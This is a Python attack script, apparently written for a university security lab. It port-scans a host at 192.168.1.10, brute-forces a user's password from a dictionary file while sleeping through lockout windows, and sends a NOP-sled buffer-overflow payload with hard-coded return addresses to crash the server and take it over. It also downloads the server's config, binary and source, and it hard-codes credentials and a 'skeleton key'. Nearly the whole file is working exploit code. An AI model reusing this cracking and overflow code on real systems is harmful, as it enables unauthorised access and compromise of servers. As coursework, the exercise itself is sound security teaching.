#!/usr/bin/env python3
import re
import socket
import time
import datetime
import argparse
import subprocess
HOST = '192.168.1.10'
PORT = 10247
SKELETONKEY = 'Passepartout'
BYTES = 100000
CRUZID = 'bosdhill'
password = "BristolRovers"
DICTIONARY = "dictionary.txt"

def parse():
     parser = argparse.ArgumentParser(
          description='Find and access PORT server belonging to user CRUZID with SKELETONKEY. Crack password using passwords in DICT file. Do a buffer overflow attack on server. Print the redirection url.',
          formatter_class=argparse.ArgumentDefaultsHelpFormatter
     )
     parser.add_argument('--ip',default='192.168.1.10',type=str,help="IP address to port scan",dest='ip')
     parser.add_argument('--key',default='Passepartout',type=str,help="SKELETONKEY",dest='key')
     parser.add_argument('--user',default='bosdhill',type=str,help="CRUZID",dest='user')
     parser.add_argument('--dict',default='dictionary.txt',type=str,help="DICT",dest='dict')
     parser.add_argument('--shell', default=False, type=bool, help="shell mode", dest='shell')
     return parser.parse_args()

def buffer_overflow():
     smash()
     subprocess.call(['scripts/./gethtml.sh', HOST, str(PORT)])
     print_redirect_url()

def to_bytes(msg):
     return bytes(msg, 'utf-8')

def to_str(byte_msg):
     return byte_msg.decode('utf-8')

def create_dict():
     passwords = []
     fp = open(DICTIONARY, "r")
     for _, line in enumerate(fp):
          passwords.append(line.replace('\n',''))
     return passwords

def print_redirect_url():
     fp = open("response.html", "r")
     lines = fp.readlines()
     start_index = lines[0].find("URL=\'")
     URL = lines[0][start_index + len("URL=\'"):].split("\'")[0]
     print(URL)

def smash():
     buf = b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08'
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST,PORT))
     s.sendall(buf)

def send_data(s, message, value, f):
     data = get_data(s, value)
     if f == True:
          fp = open(message, "wb")
          fp.write(data)

def get_data(s, value):
     s.sendall(to_bytes(value))
     time.sleep(1)
     data = s.recv(BYTES)
     return data

def get_config():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID + '\n', False)
     send_data(s, "password", password, False)
     send_data(s, "student.dat", "config\n", True)
     s.close()

def get_binary():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID + '\n', False)
     send_data(s, "password", password, False)
     send_data(s, "server", "binary\n", True)
     s.close()

def get_source():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID + '\n', False)
     send_data(s, "password", password, False)
     send_data(s, "server.c", "source\n", True)
     s.close()

def auto_connect():
     get_config()
     get_binary()
     get_source()

def shell_connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     s.sendall(to_bytes(SKELETONKEY))
     data = s.recv(BYTES)
     while True:
          x = input(to_str(data))
          s.sendall(to_bytes(x))
          data = s.recv(BYTES)
     s.close()

def get_blackout_period_from(msg):
     start_index = msg.find("next ")
     return int(msg[start_index + len("next "):].split(' seconds')[0])

# Assuming NO initial lockout
def crack_password():
     global password
     passwords = create_dict()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     # print("Sending skeletonkey...")
     s.sendall(to_bytes(SKELETONKEY))
     data = s.recv(BYTES)
     # print("Data received: %s" % data)
     # print("Sending username...")
     s.sendall(to_bytes(CRUZID + '\n'))
     data = s.recv(BYTES)
     # print("Received: %s" % data)
     i = -1
     while True:
          if to_str(data) == 'Password: ':
               i += 1
               # print("\tSending password %s..." % passwords[i])
               s.sendall(to_bytes(passwords[i]))
               data = s.recv(BYTES)
               # print("Received: %s" % data)
               if to_str(data) == 'Incorrect password, goodbye.\n':
                    # print("\tThe password %s was incorrect. :C" % passwords[i])
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # print("\tReconnecting to %s over port %d..." % (HOST, PORT))
                    s.connect((HOST, PORT))
                    # print("Sending skeletonkey...")
                    s.sendall(to_bytes(SKELETONKEY))
                    data = s.recv(BYTES)
                    # print("Data received: %s" % data)
                    # print("\tSending username...")
                    s.sendall(to_bytes(CRUZID + '\n'))
                    data = s.recv(BYTES)
                    # print("Received: %s" % data)
               else:
                    # print("Password cracked! Password is %s" % passwords[i])
                    password = passwords[i]
                    s.close()
                    buffer_overflow()
                    break
          else:
               # print("\tOut of tries!")
               # print("\t\tSleep for %d seconds at %s" % (get_blackout_period_from(to_str(data)) + 2, str(datetime.datetime.now())))
               s.close()
               time.sleep(get_blackout_period_from(to_str(data)) + 1)
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect((HOST, PORT))
               s.sendall(to_bytes(SKELETONKEY))
               data = s.recv(BYTES)
               s.sendall(to_bytes(CRUZID + '\n'))
               data = s.recv(BYTES)

def scan_ports():
     global PORT
     fp = open("ports", "r")
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          # skip for now cuz its timing out
          if PORT == 10243 or PORT == 10151:
               continue
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          # print("connecting to PORT %d" % PORT)
          s.connect((HOST, PORT))
          s.sendall(to_bytes(SKELETONKEY))
          data = s.recv(BYTES)
          s.sendall(to_bytes(CRUZID + '\n'))
          s.settimeout(5)
          data = s.recv(BYTES)
          s.close()
          # print("data received",data)
          if to_str(data) == 'Password: ':
               # print('Received %s from port %d' % (data.decode('utf-8'), PORT))
               crack_password()
               break

def main():
     global HOST
     global SKELETONKEY
     global CRUZID
     global DICTIONARY
     args = parse()
     if args.shell == True:
          shell_connect()
     HOST = args.ip
     SKELETONKEY = args.key
     CRUZID = args.user
     DICTIONARY = args.dict
     scan_ports()


if __name__ == "__main__":
     main()